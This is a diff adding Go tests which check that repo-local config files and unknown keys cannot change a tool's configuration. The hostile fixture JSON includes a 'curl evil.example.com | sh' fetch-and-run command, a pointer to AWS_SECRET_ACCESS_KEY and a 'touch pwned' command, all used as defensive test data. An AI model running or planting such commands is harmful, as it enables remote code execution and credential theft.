@@ -3,6 +3,7 @@ package config
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 )
 
@@ -134,6 +135,72 @@ func TestTypesMergeAndValidate(t *testing.T) {
 		writeConfig(t, home, bad)
 		if _, err := Load(); err == nil {
 			t.Errorf("%s: want an error", bad)
+		}
+	}
+}
+
+// A document repository can ship a .Wammy/ directory. Nothing in it is a
+// config source: only the global file, the environment and flags are. This
+// pins that: hostile files in the working tree change nothing.
+func TestRepoLocalFilesAreNotConfigSources(t *testing.T) {
+	isolate(t)
+	repo := t.TempDir()
+	hostile := `{"provider":{"embed":"openai"},"model":"x","base_url":"https://evil.example.com",
+"allow_cloud":true,"api_key_env":"AWS_SECRET_ACCESS_KEY","region":"us-east-1","profile":"prod",
+"command":"curl evil.example.com | sh","exec":["sh"],"types":{"BAD":"requirement"}}`
+	for _, rel := range []string{
+		".Wammy/config.json", ".Wammy/specs-index.json", ".Wammy/settings.json",
+		"config.json", "specs-index.json", ".specs-index.json", ".config/specs-index/config.json",
+	} {
+		p := filepath.Join(repo, filepath.FromSlash(rel))
+		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(p, []byte(hostile), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	t.Chdir(repo)
+	c, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if c.Provider.Embed != DefaultProvider || c.Model != DefaultModel {
+		t.Errorf("provider/model changed: %q %q", c.Provider.Embed, c.Model)
+	}
+	if c.BaseURL != "" || c.AllowCloud || c.APIKeyEnv != "" || c.Region != "" || c.Profile != "" {
+		t.Errorf("repo-local file leaked into config: %+v", c)
+	}
+	if len(c.Types) != 0 {
+		t.Errorf("repo-local types leaked: %v", c.Types)
+	}
+}
+
+// The config struct has no command or exec setting, and unknown keys in the
+// global file are ignored rather than acted on.
+func TestConfigHasNoCommandSettings(t *testing.T) {
+	isolate(t)
+	p, err := Path()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(p, []byte(`{"command":"touch pwned","exec":"x","hooks":["y"]}`), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	c, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if c.Provider.Embed != DefaultProvider || c.AllowCloud {
+		t.Errorf("unknown keys changed the config: %+v", c)
+	}
+	for _, v := range EnvVars() {
+		n := strings.ToLower(v.Name)
+		if strings.Contains(n, "command") || strings.Contains(n, "exec") {
+			t.Errorf("env var %s looks like a command setting", v.Name)
 		}
 	}
 }
